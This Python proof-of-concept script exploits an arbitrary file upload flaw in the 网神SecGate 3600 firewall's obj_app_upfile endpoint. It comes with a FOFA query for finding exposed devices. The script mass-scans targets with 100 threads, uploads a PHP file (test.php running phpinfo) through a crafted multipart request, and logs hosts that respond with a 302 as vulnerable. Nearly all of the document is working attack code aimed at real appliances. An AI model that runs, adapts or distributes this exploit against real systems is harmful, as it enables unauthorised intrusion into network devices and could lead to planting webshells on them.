#网神SecGate 3600防火墙obj_app_upfile任意文件上传漏洞

# fofa语法：fid="1Lh1LHi6yfkhiO83I59AYg=="

import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """

  ____             ____       _       
 / ___|  ___  ___ / ___| __ _| |_ ___ 
 \___ \ / _ \/ __| |  _ / _` | __/ _ 
  ___) |  __/ (__| |_| | (_| | ||  __/
 |____/ \___|\___|\____|\__,_|\__\___|
                                      

"""
    print(test)

def main():
    banner()

    parser = argparse.ArgumentParser(description = "网神SecGate obj_app_upfile")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")

def poc(target):
    header = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)'
    }
    data = '------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="upfile"; filename="test.php"\r\nContent-Type: text/plain\r\n\r\n<?php phpinfo();?>\r\n\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--'
    payload = '/?g=obj_app_upfile'
    url = target+payload
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False,)
        if res.status_code == 302:
            print(f"f[+]该url存在任意文件上传漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f"f[-]该url不存在任意文件上传漏洞{target}")
    except Exception:
        print(f"f[*]该url存在问题{target}")
if __name__ == '__main__':
    main()